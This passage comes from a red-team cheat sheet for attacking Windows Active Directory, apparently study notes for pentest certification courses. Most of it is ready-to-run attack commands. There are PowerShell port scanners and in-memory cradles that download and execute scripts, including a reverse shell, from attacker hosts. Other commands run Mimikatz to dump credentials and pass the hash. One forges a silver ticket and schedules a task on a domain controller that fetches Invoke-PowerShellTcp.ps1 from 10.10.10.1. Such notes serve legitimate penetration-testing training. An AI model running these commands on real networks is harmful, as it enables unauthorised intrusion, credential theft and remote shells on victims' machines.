- Still Powerview functions don't work in this context, need to find a way

```

### **Internal Network Enumeration**

- Here is the command to scan open TCP ports from a PowerShell query
    
    ```powershell
    1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
    ```
    
    > [https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/](https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/)
    > 
- The following command will scan the IP address 10.1.1.1-5 and some specific common TCP ports
    
    ```powershell
    1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a",$_)) "Port $_ is open!"} 2>$null}
    ```
    

### **Invoking a PowerShell Module**

- Scripts with file extensions "*.ps1", "*.psm1", "*.psd1", etc. can be invoked **invoked** in a specific PowerShell **session**, as shown below:
    
    ```powershell
    Import-Module <Module_Name.ps1>
    ```
    
- However, PowerShell scripts can be called in a unique way called "dot sourcing a script"
    
    ```powershell
    . .\<Script_Name>.ps1
    ```
    

### **PowerShell in-memory Download and Execute cradle :**

```powershell
iex (iwr 'http://192.168.2.2/file.ps1')
```

```powershell
$down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1")
$read = $down.GetResponse()
IEX ([System.IO.StreamReader]($read.GetResponseStream())).ReadToEnd()
```

```powershell
$file=New-Object -ComObject
Msxml2.XMLHTTP;$file.open('GET','http://192.168.2.2/file.ps1',$false);$file.sen
d();iex $file.responseText
```

```powershell
iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')
```

```powershell
$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.2.2/reverse.ps1 ‘);
sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

### Retrieve a list of users in the current domain

```powershell

#Get a list of users in the current domain

Get-NetUser
Get-NetUser –UserName emp1
```

### Get list of all properties for users in the current domain


```
# If the logon count and the bad password count of a user is tending to 0 it might be a decoy account. If the password last set of a user was also long back it might be a decoy account


Get-UserProperty
Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
Get-UserProperty -Properties logoncount
Get-UserProperty -Properties badpwdcount

```

### PowerShell Remoting

```powershell

# As an administrator
- It is used to execute commands and scripts on:
 - Windows Servers/workstations
 - Linux machines too (PowerShell is Open Source project)
 
Enable-PSRemoting -SkipNetworkProfileCheck -Verbose -Force

$session = New-PSSession –Computername Windows-Server
Invoke-Command –Session $session –ScriptBlock {Whoami;hostname}
Enter-Pssession –Session $session -verbose

```


### Mimikatz PowerShell Script

```powershell

# Used to dump all credentials, Kerberos tickets, etc. into memory
# Operate with administrative privileges to perform credential dumping operations

Invoke-Mimikatz -DumpCreds -Verbose
Invoke-Mimikatz –DumpCreds –ComputerName @(“comp1”,”comp2”)

# Most famous Pass-the-hash attack:

Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:cyberwarfare.corp/hash:/run:powershell.exe"'

```
### Command Execution using Silver Ticket :


```powershell

# The attacker creates a Silver ticket for the HOST service, allowing them to schedule malicious tasks on the target:
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-xxxxxx-yyyy-zzzzz /target:exterprise-dc.cyberwarfare.corp /service:HOST /rc4:xxxxx /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Schedule and execute tasks on the remote server
schtasks /create /S enterprise-dc.cyberwarfare.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "lateral" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.1:8000/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S enterprise-dc.cyberwarfare.corp /TN "STCheck"


```

## References

- [https://www.pentesteracademy.com/activedirectorylab](https://www.pentesteracademy.com/activedirectorylab)
- [https://www.alteredsecurity.com/adlab](https://www.alteredsecurity.com/adlab)
- [https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288)
- [https://adsecurity.org/?page_id=1821](https://adsecurity.org/?page_id=1821)
- [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
- [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
- [https://blog.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](https://blog.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://github.com/0xJs/CRTE-Cheatsheet/blob/main/README.md](https://github.com/0xJs/CRTE-Cheatsheet/blob/main/README.md)[https://www.alteredsecurity.com/redteamlab](https://www.alteredsecurity.com/redteamlab)
- [https://training.zeropointsecurity.co.uk/courses/red-team-ops](https://training.zeropointsecurity.co.uk/courses/red-team-ops)
- https://github.com/0xStarlight/CRTP-Notes/tree/main
- https://github.com/0xn1k5/Red-Teaming
- https://github.com/sec-fortress/CRTP-Notes/tree/main
